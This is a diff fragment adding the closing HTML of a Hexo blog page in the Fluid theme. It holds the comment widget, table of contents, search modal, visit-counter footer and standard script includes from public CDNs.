+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', '258369123/pinglun');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+<script src="/js/reward.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
